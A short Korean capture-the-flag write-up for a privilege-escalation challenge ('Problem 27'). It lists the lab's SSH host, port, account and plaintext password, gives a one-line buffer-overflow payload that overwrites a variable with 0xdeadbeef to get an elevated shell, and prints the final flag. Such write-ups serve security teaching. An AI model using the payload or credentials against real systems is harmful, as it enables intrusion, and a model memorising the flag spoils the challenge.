# 문제 27 - 권한상승 Challenge Solution

## 문제 설명
SSH를 통해 question27 계정으로 접속한 후, 버퍼 오버플로우 취약점을 이용하여 권한을 상승시키고 플래그를 찾는 문제입니다.

## 풀이 과정
1. SSH 접속
   - 호스트: ip.firewall-flame.kro.kr
   - 포트: 2226
   - 계정: question27
   - 비밀번호: question27pass

2. 코드 분석 및 실행
   - question27.c 파일 분석
   - gcc로 컴파일
   - 버퍼 오버플로우를 통해 val 값을 0xdeadbeef로 변경

3. 권한 상승 실행
   ```bash
   (echo -e "AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde"; cat) | ./question27
   ```

4. 플래그 확인
   - question27flag 디렉토리에서 플래그 파일 확인

## 사용된 기술
- 버퍼 오버플로우
- 리틀 엔디안 메모리 구조
- 권한 상승 (Privilege Escalation)

## 최종 플래그
```
flag{questionChallenges27flag}